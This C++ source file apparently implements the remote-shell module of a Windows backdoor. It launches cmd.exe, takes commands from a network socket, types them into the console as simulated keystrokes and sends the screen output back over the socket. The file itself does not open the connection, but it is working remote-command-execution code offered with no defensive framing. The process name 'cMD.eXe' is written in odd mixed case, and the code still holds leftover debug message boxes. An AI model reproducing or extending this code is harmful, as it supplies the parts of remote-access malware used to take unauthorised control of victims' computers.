#include<iostream>
#include <assert.h>
#include <WINSOCK2.H>
#include <string.h>
#include<windows.h>

#include<stdio.h>
#pragma comment(lib,"Ws2_32.lib")

HANDLE hCONIN, hCONOUT;
HANDLE hStdInput, hStdOutput;
HANDLE hStdCmdInPipe, hCmdPipe;

HANDLE hCmd;

void DoExecute(char *Cmd)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si,0,sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.hStdInput = hCONIN;
	si.hStdOutput = si.hStdError = hCONOUT;
	si.wShowWindow=SW_SHOW;//
	si.lpDesktop = "winsta0\\default";

	if(CreateProcess(NULL,Cmd,NULL,NULL,TRUE,0,0,NULL,&si,&pi))
	{
		hCmd = pi.hProcess;
	}
}

int WriteKeyToCmdConsoleInput(HANDLE hInPut, char ch)
{
	DWORD nEventWritten;
	BOOL fSuccess;
	INPUT_RECORD InputRecord;
	InputRecord.EventType = KEY_EVENT;
	InputRecord.Event.KeyEvent.uChar.AsciiChar = ch;

	fSuccess = WriteConsoleInput(hInPut, &InputRecord, 1, &nEventWritten);
	
	return fSuccess;
}
int WriteMessageToCmd(char *CmdMsg)
{
	DWORD BytesWritten;
	BOOL fSuccess;
	HANDLE hOutPut;
	hOutPut = CreateFile("conout$", 
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE, 
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if(hOutPut == INVALID_HANDLE_VALUE)
		return 0;

	fSuccess = WriteFile(hOutPut, CmdMsg, strlen(CmdMsg), &BytesWritten, NULL);
	CloseHandle(hOutPut);
	
	return fSuccess;
}
int WriteToCmdConsole(char *CmdMsg)
{
	int CmdLen = strlen(CmdMsg);
	BOOL fSuccess;
	HANDLE hInPut;

	hInPut = CreateFile("conin$", 
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ, 
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if(hInPut == INVALID_HANDLE_VALUE)
		return 0;

	for(int i=0; i<CmdLen; i++)
	{
		WriteKeyToCmdConsoleInput(hStdInput, CmdMsg[i]);
		fSuccess = WriteKeyToCmdConsoleInput(hInPut, CmdMsg[i]);
		if(fSuccess == false)
			break;
	}
	CloseHandle(hInPut);
	return i;
}


int SendResponseOfCMD(SOCKET Socket, COORD *InitPos)
{
	int ErrorCode;
    HANDLE hStdout; 
    BOOL fSuccess; 

	char scrBuf[8192];
	DWORD BytesWritten, bytesRead;
	COORD CurrPos = {0, 0}, ReadPos = {0, 0}, dwSize = {80, 25};
	COORD PrevPos;
	CONSOLE_SCREEN_BUFFER_INFO CSBufInfo;

	//if(!SetConsoleScreenBufferSize(hCONOUT, dwSize))
	//	ErrorCode = GetLastError();

	PrevPos = *InitPos;
	while(1)
	{
		hStdout = CreateFile("conout$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE, NULL,OPEN_EXISTING,0,0);
		if(hStdout == INVALID_HANDLE_VALUE)
			return 0;
		MessageBox(0, "CreateFile", "zx", 0);
		
		if(!GetConsoleScreenBufferInfo(hStdout, &CSBufInfo))
		{
			ErrorCode = GetLastError();
			break;
		}
		MessageBox(0, "GetConsoleScreenBufferInfo", "zx", 0);
		CurrPos = CSBufInfo.dwCursorPosition;

		if(PrevPos.Y > CurrPos.Y)
		{
			PrevPos.X = CSBufInfo.srWindow.Left;
			PrevPos.Y = CSBufInfo.srWindow.Top;
			//break;
		}

		if((PrevPos.X == CurrPos.X) && (PrevPos.Y == CurrPos.Y))
			break;

		bytesRead = (CurrPos.Y - PrevPos.Y)*80 + CurrPos.X - PrevPos.X;
		ReadPos.X = PrevPos.X;
		ReadPos.Y = PrevPos.Y;
		if(bytesRead>sizeof(scrBuf))
		{
			bytesRead = sizeof(scrBuf);
			PrevPos.X = (PrevPos.X+sizeof(scrBuf))%80;
			PrevPos.Y += sizeof(scrBuf)/80 + (PrevPos.X < ReadPos.X)?1:0;
		}else
		{
			PrevPos = CSBufInfo.dwCursorPosition;
		}

		fSuccess = ReadConsoleOutputCharacter(
			hStdout,
			scrBuf,
			bytesRead,
			ReadPos,
			&bytesRead);
		MessageBox(0, "ReadConsoleOutputCharacter", "zx", 0);

		CloseHandle(hStdout);

		if (! fSuccess) 
		{
			return 0;
		}

		MessageBox(0, scrBuf, "send cmd", 0);

		fSuccess = send(Socket, scrBuf, bytesRead, 0);
		if(fSuccess <= 0)
		{
			MessageBox(0, scrBuf, "send cmd error", 0);

			return 0;
		}

		Sleep(1);
	}
	CloseHandle(hStdout);
	return 1;
}

int ProcessDataFromClient(SOCKET Socket)
{ 
    HANDLE hStdin, hStdout;
    char szBuf[8192]; 
 
	CONSOLE_SCREEN_BUFFER_INFO CSBufInfo;
	COORD CurrPos={0,0};
    hStdin = hStdInput; 
	extern int GetCMD(SOCKET Socket, char *RecvBuf);
    while(1) 
    {
		SendResponseOfCMD(Socket, &CurrPos);
		if(! GetCMD(Socket, szBuf))
			break;
		MessageBox(0, szBuf, "cmd", 0);
		strcat(szBuf, "\r");

		hStdout = CreateFile("conout$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE, NULL,OPEN_EXISTING,0,0);
		GetConsoleScreenBufferInfo(hStdout, &CSBufInfo);
		CurrPos = CSBufInfo.dwCursorPosition;
		CurrPos.X = 0;
		CurrPos.Y++;
		CloseHandle(hStdout);

		if(! WriteToCmdConsole(szBuf))
			break;
		Sleep(100);
		
    }
	CloseHandle(hStdin);
    return 0; 
}


int XCMD(SOCKET Socket)
{
	char Buffer[256]="\0";

	SMALL_RECT Rect;
    Rect.Top = 0;    // top left: row 0, col 0 
    Rect.Left = 0; 
    Rect.Bottom = 24; // bot. right: row 1, col 79 
    Rect.Right = 79; 
	BOOL fSuccess; 
	SECURITY_ATTRIBUTES SecuAttr;
	SecuAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecuAttr.lpSecurityDescriptor = NULL;
	SecuAttr.bInheritHandle = TRUE;

	fSuccess = FreeConsole();
	fSuccess = AllocConsole();

	hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	SetHandleInformation(hStdInput, 1, 0);
	SetHandleInformation(hStdOutput, 1, 0);

	hCONIN = CreateFile("conin$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ, 
		&SecuAttr,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	hCONOUT = CreateFile("conout$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE, 
		&SecuAttr,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

	SetConsoleWindowInfo(hCONOUT, true, &Rect);
	SetConsoleCtrlHandler(NULL, 0);
	DoExecute("cMD.eXe");
	Sleep(500);

	SetConsoleCtrlHandler(NULL, 1);
	SetConsoleMode(hCONIN, ENABLE_LINE_INPUT|ENABLE_WINDOW_INPUT);

	ProcessDataFromClient(Socket);

	FreeConsole();
	return 1;
}